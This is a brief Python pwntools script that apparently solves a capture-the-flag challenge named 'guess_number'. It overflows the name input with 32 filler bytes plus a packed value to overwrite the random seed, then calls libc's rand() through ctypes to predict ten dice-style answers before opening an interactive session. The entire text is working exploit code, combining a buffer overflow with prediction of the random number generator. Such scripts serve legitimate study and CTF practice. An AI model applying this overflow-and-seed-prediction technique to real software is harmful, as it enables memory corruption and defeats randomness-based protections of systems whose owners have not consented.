from pwn import *
from ctypes import *

context(arch="amd64", os="linux", log_level="debug")

p = process("./guess_number")
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
payload = "A" * 0x20 + p64(1)
p.recvuntil("name:")
p.sendline(payload)

for i in range(10):
    num = str(libc.rand()%6 + 1)
    p.recvuntil("number:")
    p.sendline(num)

p.interactive()